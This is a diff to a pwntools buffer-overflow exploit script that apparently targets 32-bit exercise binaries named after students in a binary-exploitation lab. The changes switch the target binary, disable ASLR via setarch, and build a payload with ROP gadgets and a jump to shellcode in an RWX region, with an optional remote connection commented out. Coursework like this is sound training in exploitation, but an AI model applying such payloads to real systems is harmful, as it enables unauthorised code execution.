@@ -4,11 +4,11 @@ from pwn import *
 IP = "0.0.0.0"
 PORT = 0
 
-context.arch = "i686"
+context.arch = "i386"
 
 file_secret = "secret.txt"
-# file_binary = "10101_YAKOBCHUK_Dmytro_32"
-file_binary = "10126_ZELENIN_Vladyslav_32"
+file_binary = "10101_YAKOBCHUK_Dmytro_32"
+# file_binary = "10126_ZELENIN_Vladyslav_32"
 file_breakpoints = "breaks32.gdb"
 
 # GADGETS
@@ -21,8 +21,9 @@ ret = p32(0x8049d20)  # ret
 
 
 def run_local(debug = True, wsl2 = True):
-    env = {"LD_PRELOAD": "libc.so.6", "LD_ASLR": "off"}
-    p = process(["setarch", "-R", f"./{file_binary}"], env = env)
+    binary = ELF(f"./{file_binary}")
+    p = process(["setarch", "-R", f"./{file_binary}"], env = {})  # Clean run
+    # p = process([f"./{file_binary}"])  # For cyclic()
     pid = util.proc.pidof(p)[0]
     if debug == False:
         return p
@@ -137,12 +138,12 @@ def main():
 
     buf += p32(rwx_addr)  # Jump to shellcode
     buf = buf.ljust(4498, b"B")  # ecx after "pop ecx"
-    # buf += p32(0xffffd000)
-    buf += p32(0xdddddddd)
+    buf += p32(0xffffd000)
+    # buf += p32(0xdddddddd)
     find_bad_bytes(buf)
 
     # RUN PROCESS
-    buf = cyclic(5000)
+    # buf = cyclic(5000)
     p = run_local(debug = True, wsl2 = True)
     # p = remote(IP, PORT)
 
